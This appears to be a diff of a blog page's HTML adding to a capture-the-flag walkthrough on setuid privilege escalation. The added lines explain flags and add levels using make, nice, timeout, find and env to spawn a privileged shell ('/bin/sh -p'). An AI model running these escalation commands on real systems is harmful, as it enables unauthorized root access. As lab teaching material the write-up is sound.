@@ -332,7 +332,7 @@
 
 
                 <time class="article-words">
-                    563 字
+                    763 字
                 </time>
             </div>
         
@@ -424,9 +424,13 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bzip2 -c file_name <span class="p">|</span> bzip2 -d
+</span></span><span class="line"><span class="cl"><span class="c1">#-c:results are sent to standard output.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-d:perform the decompression</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>level 19: <strong>zip</strong></p>
@@ -458,7 +462,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ar rv flag.back flag
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ar rv flag.back flag#-r:The file is inserted into the backup file	v:show the detail information
 </span></span><span class="line"><span class="cl">cat flag.back
 </span></span></code></pre></td></tr></table>
 </div>
@@ -480,9 +484,11 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">genisoimage -sort flag
+</span></span><span class="line"><span class="cl"><span class="c1">#-sort:to re-ordering the contents of the ISO</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>execute other commands</strong></p>
@@ -491,9 +497,11 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">env /bin/sh -p <span class="c1">#getshell</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-p:/bin/sh either became bash or stayed dash which got an additional flag -p mimicking bash&#39;s behaviour, bash requires the -p flag to not drop setuid privilege.</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>level 25: <strong>find</strong>&mdash;&gt;used to find files in the specified directory</p>
@@ -503,6 +511,41 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find . -exec /bin/sh -p <span class="se">\;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>exec command in Linux is used to execute a command from the bash itself. This command does not create a new process it just replaces the bash with the command to be executed. If the exec command is successful, it does not return to the calling process.</code></p>
+<p>level 26: <strong>make</strong>&mdash;&gt; compile and install tools, manage project compilation issues</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">make -s --eval<span class="o">=</span><span class="s1">$&#39;x:\n\t-&#39;</span><span class="s2">&#34;/bin/sh -p&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-s:--silent don&#39;t echo recipes		--eval=STRING:evaluate STRING as a makefile statement</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 27: <strong>nice</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nice /bin/sh -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Usage: nice [OPTION] [COMMAND [ARG]&hellip;]</strong>
+Run COMMAND with an adjusted niceness, which affects process scheduling.With no COMMAND, print the current niceness.  Niceness values range from -20 (most favorable to the process) to 19 (least favorable to the process).</p>
+</blockquote>
+<p>level 28: <strong>timeout</strong>&mdash;&gt; start COMMAND, and kill it if still running after DURATION.</p>
+<p><strong>Usage: timeout [OPTION] DURATION COMMAND [ARG]</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">timeout 7d /bin/sh -p
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -581,7 +624,7 @@
         
             
         
-        共 0.90k 字 · 共 3篇文章
+        共 1.10k 字 · 共 3篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
             <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
